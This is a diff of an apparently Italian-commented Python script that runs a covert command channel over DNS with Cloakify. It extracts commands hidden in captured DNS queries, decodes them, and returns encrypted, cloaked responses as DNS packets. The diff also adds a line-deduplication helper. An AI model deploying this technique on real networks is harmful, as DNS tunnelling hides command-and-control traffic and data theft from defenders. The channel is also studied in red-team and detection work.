@@ -16,7 +16,7 @@ def capture_pcap(filename, packet_count):
 
 def receive_command():
     print("Capturing pcap...")
-    capture_pcap("cloaked_command.pcap", 2000) #1500
+    capture_pcap("cloaked_command.pcap", 1500) #1500
     print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
@@ -61,7 +61,7 @@ def send_response(response):
 
     # Cloakificare la risposta
     cloaked_response = "cloaked_response.txt"
-    Cloakify(encrypted_response, "ciphers\\repeated_unique_fqdn\\red_lectroids", cloaked_response)
+    Cloakify(encrypted_response, cipher, cloaked_response)
 
     # Inviare la risposta tramite pacchetti DNS
     with open(cloaked_response, 'r') as file:
@@ -72,17 +72,51 @@ def send_response(response):
     # Rimuove il file di risposta dopo l'invio
     os.remove(cloaked_response)
 
+
+def rimuovi_linee_duplicate(file_input, file_output):
+    # Insieme per tenere traccia delle linee uniche
+    linee_uniche = set()
+    prima_linea = None
+
+    with open(file_input, 'r', encoding='utf-8') as f_input:
+        for linea in f_input:
+            if prima_linea is None:
+                prima_linea = linea
+            if linea not in linee_uniche:
+                linee_uniche.add(linea)
+
+    with open(file_output, 'w', encoding='utf-8') as f_output:
+        if linee_uniche:
+            for linea in linee_uniche:
+                f_output.write(linea)
+        else:
+            f_output.write(prima_linea)
+    return file_output
+
 if __name__ == "__main__":
     print("Server in attesa di richieste...")
+    #dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
+    #cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
     
-    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
-    print(dnsQueriesFilename)
-    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=False )
-    print(cloakedFile)
+    #cloaked_command = rimuovi_linee_duplicate(cloakedFile, cloakedFile+"_")
+    decloaked_command = "decloaked_command.txt"
     
-
+    #with open(cloaked_command, 'r') as file:
+    #    if file.read().strip() == "":
+    #        print("No command received.")
+            
+        
+    # Decloakificare il comando
+    print("Decloakifying...")
+    Decloakify('cloaked.payload', cipher, decloaked_command)
+    
     '''
     while True:
         receive_command()
+        
     '''
+
+    
+
+    
     
